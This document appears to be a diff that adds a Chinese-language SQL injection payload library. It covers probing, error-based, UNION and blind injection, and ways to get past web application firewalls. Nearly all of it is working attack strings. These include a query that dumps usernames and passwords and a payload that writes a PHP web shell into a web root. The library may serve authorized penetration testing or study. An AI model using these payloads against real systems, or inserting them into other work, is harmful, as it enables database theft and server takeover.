@@ -1,0 +1,79 @@
+# SQL 注入载荷库
+# 用法：手工探 -> 确认列数 -> 提取数据
+
+## 基础探测
+'
+"
+'
+''
+"
+ 1' AND '1'='1
+ 1' AND '1'='2
+ 1 AND 1=1
+ 1 AND 1=2
+ 1)
+ 1))
+ 1;
+ 1' --
+ 1' #
+ 1' /*
+ 1' AND SLEEP(5)--
+ 1' AND SLEEP(5)#
+ 1) AND SLEEP(5)--
+ 1' WAITFOR DELAY '0:0:5'--        # MSSQL
+ 1' AND pg_sleep(5)--              # PostgreSQL
+ 1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- # Oracle
+
+## 报错注入
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND 1=CAST((SELECT version()) AS int)--
+' AND 1=CONVERT(int,@@version)--
+
+## UNION 注入
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT version(),user(),database()--
+' UNION ALL SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--
+
+## 布尔盲注（逐字符）
+' AND SUBSTRING(database(),1,1)='a'--
+' AND ASCII(SUBSTRING(database(),1,1))>97--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND LENGTH(database())>5--
+' AND MID(database(),1,1)=0x61--
+
+## 时间盲注
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--
+' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(3),0)--
+' AND (SELECT 1 FROM (SELECT SLEEP(3))a)--
+' AND BENCHMARK(5000000,MD5(1))--
+
+## 写入（仅授权测试环境，慎用）
+' UNION SELECT "<?php @eval(\$_POST[1]);?>" INTO OUTFILE '/var/www/html/x.php'--
+' UNION SELECT 1,2,"shell" INTO DUMPFILE '/tmp/x'--
+
+## 绕过 WAF 技巧
+# 大小写混合
+' aNd 1=1--
+# 内联注释
+' /*!AND*/ 1=1--
+' /*!50000AND*/ 1=1--
+# 替换空格
+'/**/AND/**/1=1--
+'%09AND%091=1--
+'%0AAND%0A1=1--
+# 等价函数
+SUBSTRING -> MID / SUBSTR / RIGHT / LEFT
+ASCII -> ORD / HEX
+SLEEP -> BENCHMARK / pg_sleep
+= -> LIKE / REGEXP / IN / BETWEEN
+# 双重编码（针对 URL 解码 WAF）
+%2527 = '
+%2555nion = Union
